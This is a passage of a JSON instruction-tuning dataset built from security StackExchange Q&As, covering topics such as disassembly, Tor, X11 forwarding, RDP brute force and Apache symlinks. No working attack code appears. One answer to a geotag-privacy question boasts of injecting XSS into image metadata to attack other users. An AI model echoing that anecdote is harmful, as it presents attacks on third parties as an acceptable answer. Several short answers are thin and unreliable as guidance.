    "instruction": "Answer this question:\n\nWhat is the difference between static disassembly and dynamic disassembly?\nI am told that tools like IDA Pro are static disassembly tool,\nand tools like OllyDbg are dynamic disassembly tool.\nBut from the using experiences on these tools, I don't think there \nis any difference between the tools in disassembly procedure.\nBasically all you need to do is load binary file into IDA or OllyDbg, \nand they will use certain recursive disassembly algorithm to disassembly\nthe binary and give you the output.\nAm I wrong..? Then what is the difference between static disassembly \nand dynamic disassembly..?\nThank you!",
    "context": "",
    "output": "A: You have a mix up here. There is no such thing as dynamic disassembly and static disassembly but rather dynamic \n\nDynamic program analysis is the analysis of computer software that is performed by executing programs on a real or virtual processor.\n\nand static analysis of a binary. \n\nStatic program analysis is the analysis of computer software that is performed without actually executing programs\n\nWhat do the mentioned tools have are different disassembly engines which sometimes produce different results, mainly from binaries which incorporate anti-disassembly techniques.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the difference between static disassembly and dynamic disassembly?\nI am told that tools like IDA Pro are static disassembly tool,\nand tools like OllyDbg are dynamic disassembly tool.\nBut from the using experiences on these tools, I don't think there \nis any difference between the tools in disassembly procedure.\nBasically all you need to do is load binary file into IDA or OllyDbg, \nand they will use certain recursive disassembly algorithm to disassembly\nthe binary and give you the output.\nAm I wrong..? Then what is the difference between static disassembly \nand dynamic disassembly..?\nThank you!",
      "answer": "You have a mix up here. There is no such thing as dynamic disassembly and static disassembly but rather dynamic \n\nDynamic program analysis is the analysis of computer software that is performed by executing programs on a real or virtual processor.\n\nand static analysis of a binary. \n\nStatic program analysis is the analysis of computer software that is performed without actually executing programs\n\nWhat do the mentioned tools have are different disassembly engines which sometimes produce different results, mainly from binaries which incorporate anti-disassembly techniques."
    }
  },
  {
    "instruction": "Q: Can I block based on MAC address?\nIf I block an IP, the attacker can work around the block by taking a new IP or use a proxy. Is it possible to make a ban based on MAC address? I want to block at the webserver level so that unwanted users don't create unnecessary traffic to the site.\nIs the MAC address sent as a part of HTTP request?",
    "context": "",
    "output": " A: Source MAC addresses (layer 2) are only going to show the last router to forward the packet.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can I block based on MAC address?\nIf I block an IP, the attacker can work around the block by taking a new IP or use a proxy. Is it possible to make a ban based on MAC address? I want to block at the webserver level so that unwanted users don't create unnecessary traffic to the site.\nIs the MAC address sent as a part of HTTP request?",
      "answer": "Source MAC addresses (layer 2) are only going to show the last router to forward the packet."
    }
  },
  {
    "instruction": "Please answer this question: Is it possible to retrieve data from a intermediate node in Tor browser\nI'm using Tor browser for my internet surfing and check my email,\nmy questions are\n\nIs my internet services provider able to see the websites I visited\nIs it possible to retrieve a login information like username and\npassword of my email account from intermediate node between Tor\nbrowser and web server\nIs it possible to retrieve email content like mail body and\nattchments from intermediate node",
    "context": "",
    "output": "Is my internet services provider able to see the websites I visited\n\n\nNo. Your Internet service provider can not see which website you visit (I suppose you use Tor correctly without your personal settings/configurations you may have done. Tor will take care of your DNS leaks and so on) \n\n\nIs it possible to retrieve a login information like username and password of my email account from intermediate node between Tor\n  browser and web server\n\n\nFirst of all, using your credentials to log into this or that website breaks, by time, the anonymity Tor provides you. Also, an attacker may eavesdrop the exit nodes where Tor does not control the traffic.\n\n\nIs it possible to retrieve email content like mail body and attachments from intermediate node\n\n\nOnce again, using your credentials through Tor breaks your anonymity. Tor intermediate nodes are too hard theoretically to break (of course, there are buts). Real life eavesdropping that targeted Tor users has been done on exit nodes such as when this Swedish researcher compromised username/passwords of lot of Tor users (in which case, of course, your attachments and so on are also compromised)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it possible to retrieve data from a intermediate node in Tor browser\nI'm using Tor browser for my internet surfing and check my email,\nmy questions are\n\nIs my internet services provider able to see the websites I visited\nIs it possible to retrieve a login information like username and\npassword of my email account from intermediate node between Tor\nbrowser and web server\nIs it possible to retrieve email content like mail body and\nattchments from intermediate node",
      "answer": "Is my internet services provider able to see the websites I visited\n\n\nNo. Your Internet service provider can not see which website you visit (I suppose you use Tor correctly without your personal settings/configurations you may have done. Tor will take care of your DNS leaks and so on) \n\n\nIs it possible to retrieve a login information like username and password of my email account from intermediate node between Tor\n  browser and web server\n\n\nFirst of all, using your credentials to log into this or that website breaks, by time, the anonymity Tor provides you. Also, an attacker may eavesdrop the exit nodes where Tor does not control the traffic.\n\n\nIs it possible to retrieve email content like mail body and attachments from intermediate node\n\n\nOnce again, using your credentials through Tor breaks your anonymity. Tor intermediate nodes are too hard theoretically to break (of course, there are buts). Real life eavesdropping that targeted Tor users has been done on exit nodes such as when this Swedish researcher compromised username/passwords of lot of Tor users (in which case, of course, your attachments and so on are also compromised)"
    }
  },
  {
    "instruction": "Q: Logging in a user after password reset via link\nLets say password reset functionality flow is the following:\n\nUser submits email address used for his account.\nAn email is sent to that email address with a link with a password reset hash.\nUpon clicking, a user can reset password.\n\n\nI see websites redirect a user to a login page after a password reset is complete. Is there a security risk in logging in user automatically after password reset is complete?",
    "context": "",
    "output": " A: There's no difference. If a hacker got to the link, then he can anyway reset the password and log in again. It makes no difference to him, he can't further abuse the feature.\nThe only time it makes sense to do this is if your using some form of multi factor authentication. Of course, in that case, one would expect you to include the multi factor bit in the reset workflow as well.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Logging in a user after password reset via link\nLets say password reset functionality flow is the following:\n\nUser submits email address used for his account.\nAn email is sent to that email address with a link with a password reset hash.\nUpon clicking, a user can reset password.\n\n\nI see websites redirect a user to a login page after a password reset is complete. Is there a security risk in logging in user automatically after password reset is complete?",
      "answer": "There's no difference. If a hacker got to the link, then he can anyway reset the password and log in again. It makes no difference to him, he can't further abuse the feature.\nThe only time it makes sense to do this is if your using some form of multi factor authentication. Of course, in that case, one would expect you to include the multi factor bit in the reset workflow as well."
    }
  },
  {
    "instruction": "Answer the following question:\n\nIs it safe to signup multiple applications with facebook?\nPutting all eggs in one basket.. Is it safe to sign-up on different applications with facebook or such similar platforms, linkedin, twitter etc?",
    "context": "",
    "output": "Is it safe to signup on multiple applications with single email address? The same thing applies here too. One thing is when you sign up on other applications through social networks, your circle may get notifications of your activity. If you have privacy issues, you can set your social media settings to private. Keep your passwords and security questions strong.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it safe to signup multiple applications with facebook?\nPutting all eggs in one basket.. Is it safe to sign-up on different applications with facebook or such similar platforms, linkedin, twitter etc?",
      "answer": "Is it safe to signup on multiple applications with single email address? The same thing applies here too. One thing is when you sign up on other applications through social networks, your circle may get notifications of your activity. If you have privacy issues, you can set your social media settings to private. Keep your passwords and security questions strong."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Why do most browsers store browsing history by default?\nWhy do most browsers store browsing history by default? It seems like people often have to go to the hassle of manually deleting their history or using incognito mode. Are there some major advantages to storing this data in most cases?",
    "context": "",
    "output": "answer: The HTML standard is that unvisited links and previously-visited links are styled differently. By default in most browsers, an unvisited link is blue and a visited link is pink, but nearly every web page these days overrides that. In order to do this, you have to have a list of previously visited links so that you know what style to use for every link on every page, which is to say a browser history.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why do most browsers store browsing history by default?\nWhy do most browsers store browsing history by default? It seems like people often have to go to the hassle of manually deleting their history or using incognito mode. Are there some major advantages to storing this data in most cases?",
      "answer": "The HTML standard is that unvisited links and previously-visited links are styled differently. By default in most browsers, an unvisited link is blue and a visited link is pink, but nearly every web page these days overrides that. In order to do this, you have to have a list of previously visited links so that you know what style to use for every link on every page, which is to say a browser history."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Crash after exe modification\nI am testing a malware that built as COM EXE service. This exe file has a digital signature.\nI succeeded to remove the digital signature for trying to modify it for reverse engineering tests.\nBut when I open it in OllyDbg and make any tiny change, the malware crash and not runs at all. Even if I tries to change one byte in the code cave to nop command, the malware not running.\nWhy can't I change it even in the code cave? Any idea?",
    "context": "",
    "output": "answer: Maybe the malware have a hash like \"SHA1\" of its own code so when the malaware run he will check the checksum of executable in memory and compare the hash of memory with the one included in code\ntry to see at starting point what the malware is doing like memory raiding and also search where he call the exit() function or any function that will make it exit",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Crash after exe modification\nI am testing a malware that built as COM EXE service. This exe file has a digital signature.\nI succeeded to remove the digital signature for trying to modify it for reverse engineering tests.\nBut when I open it in OllyDbg and make any tiny change, the malware crash and not runs at all. Even if I tries to change one byte in the code cave to nop command, the malware not running.\nWhy can't I change it even in the code cave? Any idea?",
      "answer": "Maybe the malware have a hash like \"SHA1\" of its own code so when the malaware run he will check the checksum of executable in memory and compare the hash of memory with the one included in code\ntry to see at starting point what the malware is doing like memory raiding and also search where he call the exit() function or any function that will make it exit"
    }
  },
  {
    "instruction": "Q: Security Concerns with X11 Forwarding\nWhat are some of the security concerns and reasons either for or against allowing X11 Forwarding.  I have generally taken an approach of not allowing it under the blanket guise of security.  Recently, I had a user indicated that they thought that the security implications of resulting from allowing X11 Forwarded sessions were negligible.  I was curious to learn more about what the harm is in allowing X11 Forwarding and why one might want to allow it.",
    "context": "",
    "output": " A: Let's say I open a SSH connection to someserver, with X11 forwarding enabled.  The primary risk is that if someserver is malicious, then someserver can do all sorts of nasty stuff to the windows/applications I have open on my own computer.\nFor instance, someserver can open up windows on my computer, can close other windows I have open, can spy on the contents of other windows I have open, can spy on the keys I type into other windows, can inject spoofed keystrokes and mouse events into other windows I have open, and generally just mess with every other window I have open on my machine -- even if some of those other windows are local applications running locally.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Security Concerns with X11 Forwarding\nWhat are some of the security concerns and reasons either for or against allowing X11 Forwarding.  I have generally taken an approach of not allowing it under the blanket guise of security.  Recently, I had a user indicated that they thought that the security implications of resulting from allowing X11 Forwarded sessions were negligible.  I was curious to learn more about what the harm is in allowing X11 Forwarding and why one might want to allow it.",
      "answer": "Let's say I open a SSH connection to someserver, with X11 forwarding enabled.  The primary risk is that if someserver is malicious, then someserver can do all sorts of nasty stuff to the windows/applications I have open on my own computer.\nFor instance, someserver can open up windows on my computer, can close other windows I have open, can spy on the contents of other windows I have open, can spy on the keys I type into other windows, can inject spoofed keystrokes and mouse events into other windows I have open, and generally just mess with every other window I have open on my machine -- even if some of those other windows are local applications running locally."
    }
  },
  {
    "instruction": "Application to monitor software activities\nI am doing black box testing on a software which is installed in my local machine. I want to analyze and see the list of files and registry entries that software create/modify/delete. Basically analyze a software for the files which software deals with. is there any software available to do this?\nAm using Windows machine.",
    "context": "",
    "output": "I'd suggest that you could use Process Monitor from the sysinternals suite to do this.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Application to monitor software activities\nI am doing black box testing on a software which is installed in my local machine. I want to analyze and see the list of files and registry entries that software create/modify/delete. Basically analyze a software for the files which software deals with. is there any software available to do this?\nAm using Windows machine.",
      "answer": "I'd suggest that you could use Process Monitor from the sysinternals suite to do this."
    }
  },
  {
    "instruction": "Question: Check photos for geotagging and remove lat/long data\nI like to upload photos to various internet services, but I prefer not to share my geographic location.  I understand Facebook and other services strip out the geolocation data, but they still have the data.  I want to keep that data to myself and not share geolocation. \nWhat are some tools that can find if geolocation data exists in a photo?\nIs there a way I can manually strip this data from my photos?",
    "context": "",
    "output": "Answer: I have used exiftool for this kind of work. It basicly lets you review and edit any meta information in your pictures.\nI used this to exploit a image service which echoed the geo details back at the user. I filled the images geo data with XSS and attacked other users viewing the picture.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Check photos for geotagging and remove lat/long data\nI like to upload photos to various internet services, but I prefer not to share my geographic location.  I understand Facebook and other services strip out the geolocation data, but they still have the data.  I want to keep that data to myself and not share geolocation. \nWhat are some tools that can find if geolocation data exists in a photo?\nIs there a way I can manually strip this data from my photos?",
      "answer": "I have used exiftool for this kind of work. It basicly lets you review and edit any meta information in your pictures.\nI used this to exploit a image service which echoed the geo details back at the user. I filled the images geo data with XSS and attacked other users viewing the picture."
    }
  },
  {
    "instruction": "Answer this question:\n\nWebsite Visited by Unresolved Ip\nMy Website is flooded with unknown visiters\nAwstats says that my website getting thousands of hits in few seconds.\n    I am using robots.txt and .htaccess, but the problem stays there. Please help me with this. Hosting service suspend my site because of this heavy traffic from unknown IP.",
    "context": "",
    "output": "A: You simply can't protect your website from illegetimate requests like this. Consider moving your site behind a service which does packet scrubbing and verifies the legitimacy of the connection. One free service you could have a look at is CloudFlare.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Website Visited by Unresolved Ip\nMy Website is flooded with unknown visiters\nAwstats says that my website getting thousands of hits in few seconds.\n    I am using robots.txt and .htaccess, but the problem stays there. Please help me with this. Hosting service suspend my site because of this heavy traffic from unknown IP.",
      "answer": "You simply can't protect your website from illegetimate requests like this. Consider moving your site behind a service which does packet scrubbing and verifies the legitimacy of the connection. One free service you could have a look at is CloudFlare."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow does changing your password every 90 days increase security?\nWhere I work I'm forced to change my password every 90 days.  This security measure has been in place in many organizations for as long as I can remember.  Is there a specific security vulnerability or attack that this is designed to counter, or are we just following the procedure because \"it's the way it has always been done\"?\nIt seems like changing my password would only make me more secure if someone is already in my account.\n\nThis question was IT Security Question of the Week.\n  Read the Jul 15, 2011 blog entry for more details or submit your own Question of the Week.",
    "context": "",
    "output": "There was a study by Microsoft concluding the password expiration policy does not increase the security in real life scenarios.\nThese articles were removed, but available on the Internet Archive:\n\nPlease do not change your password \nStudy: Frequent password changes are useless\n\nOriginal: So Long, And No Thanks for the Externalities:\nThe Rational Rejection of Security Advice by Users",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does changing your password every 90 days increase security?\nWhere I work I'm forced to change my password every 90 days.  This security measure has been in place in many organizations for as long as I can remember.  Is there a specific security vulnerability or attack that this is designed to counter, or are we just following the procedure because \"it's the way it has always been done\"?\nIt seems like changing my password would only make me more secure if someone is already in my account.\n\nThis question was IT Security Question of the Week.\n  Read the Jul 15, 2011 blog entry for more details or submit your own Question of the Week.",
      "answer": "There was a study by Microsoft concluding the password expiration policy does not increase the security in real life scenarios.\nThese articles were removed, but available on the Internet Archive:\n\nPlease do not change your password \nStudy: Frequent password changes are useless\n\nOriginal: So Long, And No Thanks for the Externalities:\nThe Rational Rejection of Security Advice by Users"
    }
  },
  {
    "instruction": "Q: RDP Audit Failures Brute Force Attacks\nI need some help on tracking the source of these RDP access attempts on our terminal server. \nPort 3389 is open on the firewall (I know this is a terrible practice. I don't want to hear advice on using a VPN for LAN access). I checked through the security audits and can see that we are getting hit just about every second with a dictionary attack. I have checked the RemoteDesktopServices-RdpCoreTS operational events for IP addresses. No IP address has had repeated entries, except for about 1 or 2.. so I believe they are spoofing the IP. \nOur firewall also shows no active 3389 port connections during the attacks. \nIs it possible that there is an infection on a local computer causing this? It's very confusing, but I'm still in school so am not fully equipped with knowledge.",
    "context": "",
    "output": " A: It is not likely a spoof (the attacker would not know if they were successful) but more likely a botnet cycling through its nodes to attack you. That's why it's a range of IPs. They cycle like this so that no one IP triggers a block.\nThen is it also not likely that it is a local computer.\nThis behaviour is neither extraordinary nor unexpected. Just business as usual on the Internet. That's why exposing services like this is not recommended unless you have mitigations in place like only allowing certain IPs to connect to port 3389.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "RDP Audit Failures Brute Force Attacks\nI need some help on tracking the source of these RDP access attempts on our terminal server. \nPort 3389 is open on the firewall (I know this is a terrible practice. I don't want to hear advice on using a VPN for LAN access). I checked through the security audits and can see that we are getting hit just about every second with a dictionary attack. I have checked the RemoteDesktopServices-RdpCoreTS operational events for IP addresses. No IP address has had repeated entries, except for about 1 or 2.. so I believe they are spoofing the IP. \nOur firewall also shows no active 3389 port connections during the attacks. \nIs it possible that there is an infection on a local computer causing this? It's very confusing, but I'm still in school so am not fully equipped with knowledge.",
      "answer": "It is not likely a spoof (the attacker would not know if they were successful) but more likely a botnet cycling through its nodes to attack you. That's why it's a range of IPs. They cycle like this so that no one IP triggers a block.\nThen is it also not likely that it is a local computer.\nThis behaviour is neither extraordinary nor unexpected. Just business as usual on the Internet. That's why exposing services like this is not recommended unless you have mitigations in place like only allowing certain IPs to connect to port 3389."
    }
  },
  {
    "instruction": "Q: How (un)safe is it to use TKIP?\nI have recently bought a wifi range extender to improve the signal coverage through the house. When I set it up, I noticed the iOS 14 recognizes it as unsafe since it uses TKIP and advises to set it up to use AES instead. I did my research and according to the manufacturer, it seems the device automatically uses WPA2 for devices that support it, but there is a WPA-TKIP combination also available for older devices and there is no way to disable it.\nSo the question I've got, is how safe/unsafe it is to use it anyway, considering the fact that there are only a few mobile devices ever connected to it and all the rest are connected to the main router which uses WPA2? What real-world attacks am I exposing myself to and are they only limited to the extended network or is it possible for the attacker to also access the main one (the main router)?\nI apologize if there are potential trivial things I don't know about this and I'm asking some rather obvious question, networking and security are not exactly my strong points. Appreciate the help.",
    "context": "",
    "output": " A: TKIP is deprecated since 2010, and practical attacks exists against it. You should not use it. Since you do not have devices that requires it, you have no reason to leave it activated and all the reasons to disable it. I suggest you look into your range extender manual for how to configure it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How (un)safe is it to use TKIP?\nI have recently bought a wifi range extender to improve the signal coverage through the house. When I set it up, I noticed the iOS 14 recognizes it as unsafe since it uses TKIP and advises to set it up to use AES instead. I did my research and according to the manufacturer, it seems the device automatically uses WPA2 for devices that support it, but there is a WPA-TKIP combination also available for older devices and there is no way to disable it.\nSo the question I've got, is how safe/unsafe it is to use it anyway, considering the fact that there are only a few mobile devices ever connected to it and all the rest are connected to the main router which uses WPA2? What real-world attacks am I exposing myself to and are they only limited to the extended network or is it possible for the attacker to also access the main one (the main router)?\nI apologize if there are potential trivial things I don't know about this and I'm asking some rather obvious question, networking and security are not exactly my strong points. Appreciate the help.",
      "answer": "TKIP is deprecated since 2010, and practical attacks exists against it. You should not use it. Since you do not have devices that requires it, you have no reason to leave it activated and all the reasons to disable it. I suggest you look into your range extender manual for how to configure it."
    }
  },
  {
    "instruction": "Answer the question below.\nHow to protect source code that resides on virtualbox web server which starts at boot?\nI installed CentOS 6 on a 3gb virtualbox disk. It hosts a web server which starts automatically when the OS boots. No user login required. When it boots, it is given an IP and the host machine can connect to the server. \nThe idea is to hand this to someone on a flash drive, let them install virtualbox on their computer and run the image to start the server.\nThe server software is written in an interpreted language and the source code also resides on the image. The problem is, we don't want someone to hack into the disk and get the source code that is plainly lying around. \nSince we want the httpd to start at boot without giving anyone any passwords, we can't encrypt the disk. Disk encryption also leads to complications since httpd will have to start after encrypted volume is mounted etc.\nConsidering these constraints, what options do I have in order to protect the source code inside the virtual drive?",
    "context": "",
    "output": "Virtual machine, but real CPU. Regardless of how you elect to see it, the code for your server still runs on the machine of the supposed attacker. Similarly, disk encryption of any kind would not help either, even if you personally typed the password yourself upon boot: at some point, the data is still decrypted, on the attacker's machine.\nVirtual machines don't offer any protection against that kind of inspection. VM protect the host operating system from the guest, not the other way round.\nThis is one of these situations where \"go Cloud\" is a good advice. Don't give a USB Flash drive; instead, host the code on a server somewhere. That way, you keep control of the whereabouts of the data and who reads it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to protect source code that resides on virtualbox web server which starts at boot?\nI installed CentOS 6 on a 3gb virtualbox disk. It hosts a web server which starts automatically when the OS boots. No user login required. When it boots, it is given an IP and the host machine can connect to the server. \nThe idea is to hand this to someone on a flash drive, let them install virtualbox on their computer and run the image to start the server.\nThe server software is written in an interpreted language and the source code also resides on the image. The problem is, we don't want someone to hack into the disk and get the source code that is plainly lying around. \nSince we want the httpd to start at boot without giving anyone any passwords, we can't encrypt the disk. Disk encryption also leads to complications since httpd will have to start after encrypted volume is mounted etc.\nConsidering these constraints, what options do I have in order to protect the source code inside the virtual drive?",
      "answer": "Virtual machine, but real CPU. Regardless of how you elect to see it, the code for your server still runs on the machine of the supposed attacker. Similarly, disk encryption of any kind would not help either, even if you personally typed the password yourself upon boot: at some point, the data is still decrypted, on the attacker's machine.\nVirtual machines don't offer any protection against that kind of inspection. VM protect the host operating system from the guest, not the other way round.\nThis is one of these situations where \"go Cloud\" is a good advice. Don't give a USB Flash drive; instead, host the code on a server somewhere. That way, you keep control of the whereabouts of the data and who reads it."
    }
  },
  {
    "instruction": "Q: How to securely read a physical memory address in Linux?\nI am trying to read a physical memory address in a device running embedded Linux with our application. The widely suggested method is to use mmap, convert it into virtual address and then read the value.\nNow I would like to know if it a man in the midde attack is possible by replacing the standard mmap library with a spurious mmap library? That is, can a hacker prevent me from reading the intended value from the underlying hardware? Is there a secure way to read the physical address?\nIn other words I am looking to read a physical address and I would like to know the value that I read is from the actual hardware and not a spoofed value.",
    "context": "",
    "output": " A: Don't worry about it. If an attacker can replace system libraries that are being used by your application, then you have been totally compromised and can't trust anything in your app. It's not a situation you can really protect against.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to securely read a physical memory address in Linux?\nI am trying to read a physical memory address in a device running embedded Linux with our application. The widely suggested method is to use mmap, convert it into virtual address and then read the value.\nNow I would like to know if it a man in the midde attack is possible by replacing the standard mmap library with a spurious mmap library? That is, can a hacker prevent me from reading the intended value from the underlying hardware? Is there a secure way to read the physical address?\nIn other words I am looking to read a physical address and I would like to know the value that I read is from the actual hardware and not a spoofed value.",
      "answer": "Don't worry about it. If an attacker can replace system libraries that are being used by your application, then you have been totally compromised and can't trust anything in your app. It's not a situation you can really protect against."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow can an attacker access a system with a private IP address?\nI am confused about this concept if a public IP is assigned to my router and my system has private IP address, how an attacker can access my system or can use my system as a BOT.\nIts a common scenario when we click or download some malicious file than an attacker got controlled. Is there any other way to open the door(Router) with some thing like duplicate key ?",
    "context": "",
    "output": "The router is like a automated door that would:\n\nLet anyone open it from the inside\nRequire a passcode to open from the outside\n\nThere are multiple ways to bypass the normal behaviour, some are exploiting flaw in the implementation of the router, other flaw in the protocols and some in design.\nLet's say you invited a friend to stay at your home, then you go to work. If he is a bad friend, calls thieves and open the door from the inside for them, thieves can come in and rob you. \nWell, now you decided not to entrust anyone. A thieves can come to your door, confuse the automate to let him think he is inside so that the door opens (e.g. TCP flag manipulation). \nThe thieves can also go to a bar you're usually in, pay you a couple of beers and get the passcode to enter from yourself.\nThe thief can also go to the door with a list of passcodes and try them one by one until the door opens. \nIf you open a port for a service, let's say you are a medical doctor with a secretary. People may come in and go to the secretary, but not come in and go to your house. A thieve can come in, disrupt/dupe the secretary and go in your house while she's not looking.\nBack on more computer thematic. Once inside, an attacker can exploit a vulnerability of your computer to install a bot on your machine. Then your machine will try to access the internet, which it is allowed to do anyway.\nPer se, NAT masquerading is not a security measure, because it has initially been design to allow multiple computers to access the internet using a single public IP address. The more we progress, the better the router are able to block malicious request coming from the outside. But they are always cases where it's not easy to distinguish legal traffic from forged one.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can an attacker access a system with a private IP address?\nI am confused about this concept if a public IP is assigned to my router and my system has private IP address, how an attacker can access my system or can use my system as a BOT.\nIts a common scenario when we click or download some malicious file than an attacker got controlled. Is there any other way to open the door(Router) with some thing like duplicate key ?",
      "answer": "The router is like a automated door that would:\n\nLet anyone open it from the inside\nRequire a passcode to open from the outside\n\nThere are multiple ways to bypass the normal behaviour, some are exploiting flaw in the implementation of the router, other flaw in the protocols and some in design.\nLet's say you invited a friend to stay at your home, then you go to work. If he is a bad friend, calls thieves and open the door from the inside for them, thieves can come in and rob you. \nWell, now you decided not to entrust anyone. A thieves can come to your door, confuse the automate to let him think he is inside so that the door opens (e.g. TCP flag manipulation). \nThe thieves can also go to a bar you're usually in, pay you a couple of beers and get the passcode to enter from yourself.\nThe thief can also go to the door with a list of passcodes and try them one by one until the door opens. \nIf you open a port for a service, let's say you are a medical doctor with a secretary. People may come in and go to the secretary, but not come in and go to your house. A thieve can come in, disrupt/dupe the secretary and go in your house while she's not looking.\nBack on more computer thematic. Once inside, an attacker can exploit a vulnerability of your computer to install a bot on your machine. Then your machine will try to access the internet, which it is allowed to do anyway.\nPer se, NAT masquerading is not a security measure, because it has initially been design to allow multiple computers to access the internet using a single public IP address. The more we progress, the better the router are able to block malicious request coming from the outside. But they are always cases where it's not easy to distinguish legal traffic from forged one."
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhat is the security problem of Options FollowSymLinks in the Apache configuration?\nWhat is the security problem to use Options FollowSymLinks in the Apache configuration?\nWe use the following configuration:\nAllowOverride None\nOptions None FollowSymLinks",
    "context": "",
    "output": "If you enable following of symbolic links, and an attacker gains access to something allowing him to create arbitrary files on your webserver, he could then create symbolic links to any file on your system (e.g. /etc/passwd, configurations files of databases, ...)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the security problem of Options FollowSymLinks in the Apache configuration?\nWhat is the security problem to use Options FollowSymLinks in the Apache configuration?\nWe use the following configuration:\nAllowOverride None\nOptions None FollowSymLinks",
      "answer": "If you enable following of symbolic links, and an attacker gains access to something allowing him to create arbitrary files on your webserver, he could then create symbolic links to any file on your system (e.g. /etc/passwd, configurations files of databases, ...)"
    }
  },
  {
    "instruction": "Question: Reference \"non-secured\" web application?\nI'm new to both web development and security, and I was wondering whether there is some kind of reference web application that doesn't follow any of the security best practices. Something like a \"Security hello world\" :).\nOn OWASP's site there are code examples for almost every threat, I was wondering whether there is an application that would put them all together. \nI would like to use it to both test my knowledge while trying to find the flaws, and to run and understand ESAPI with it.\n\nMeanwhile a colleague of mine pointed me to OWASP's complete (and up-to-date) list of deliberately vulnerable web applications. There's so many of them, I really have to work on my googling aptitudes...",
    "context": "",
    "output": "Answer: WebGoat\nMultidillae\nSamurai Dojo\nGoogle Gruyere\nDamn Vulnerable Web Application (DVWA)\nHack Yourself First",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Reference \"non-secured\" web application?\nI'm new to both web development and security, and I was wondering whether there is some kind of reference web application that doesn't follow any of the security best practices. Something like a \"Security hello world\" :).\nOn OWASP's site there are code examples for almost every threat, I was wondering whether there is an application that would put them all together. \nI would like to use it to both test my knowledge while trying to find the flaws, and to run and understand ESAPI with it.\n\nMeanwhile a colleague of mine pointed me to OWASP's complete (and up-to-date) list of deliberately vulnerable web applications. There's so many of them, I really have to work on my googling aptitudes...",
      "answer": "WebGoat\nMultidillae\nSamurai Dojo\nGoogle Gruyere\nDamn Vulnerable Web Application (DVWA)\nHack Yourself First"
    }
  },
  {
    "instruction": "Can you tell me the answer to: Can ransomware run without prompting user?\nThat is, a user downloads attachment from email and runs it, will the ransomware run silently without showing the security prompt/UAC (that should block non-administrator users...)",
    "context": "",
    "output": "answer: Ransomware wouldn't need to raise a UAC alert as it is after a user's personal files, not system files.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can ransomware run without prompting user?\nThat is, a user downloads attachment from email and runs it, will the ransomware run silently without showing the security prompt/UAC (that should block non-administrator users...)",
      "answer": "Ransomware wouldn't need to raise a UAC alert as it is after a user's personal files, not system files."
    }
  },
  {
    "instruction": "Question: How SSL Handshake recognise any attack\nI already know that a replay attack on an SSL handshake is ineffective, but if we suppose that an \"intruder\" has listened and has got all of the information from a previous handshake, how will the server recognise the attack?\nThis is for SSL with RSA one-way and for SSL with RSA one-way: verification on phase 2.\nCould you please give advice?",
    "context": "",
    "output": "Answer: The SSL handshake includes random data from both client and server. While the attacker might replay the ClientHello which includes only the random data from the client he cannot complete the full handshake by just replaying previously captured data since the messages needed for completion also depend on the server side random data, which will change with each new handshake.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How SSL Handshake recognise any attack\nI already know that a replay attack on an SSL handshake is ineffective, but if we suppose that an \"intruder\" has listened and has got all of the information from a previous handshake, how will the server recognise the attack?\nThis is for SSL with RSA one-way and for SSL with RSA one-way: verification on phase 2.\nCould you please give advice?",
      "answer": "The SSL handshake includes random data from both client and server. While the attacker might replay the ClientHello which includes only the random data from the client he cannot complete the full handshake by just replaying previously captured data since the messages needed for completion also depend on the server side random data, which will change with each new handshake."
    }
  },
  {
    "instruction": "Answer the question below.\nHow can I extract the certificate from this pcap file?\nI have a pcap file of 14 sniffed SSL packets. I uploaded it here:\nssl.pcap\nI opened it with wireshark. I see the 14 packets. The largest of seems to contain a self signed certificate (as it is made in a populat internet tutorial). I see the packet contains test like \"Some-state\" and \"Intenet Widgets Pty Ltd\" ... How can I actually extract the real certificate (maybe in crt format?",
    "context": "",
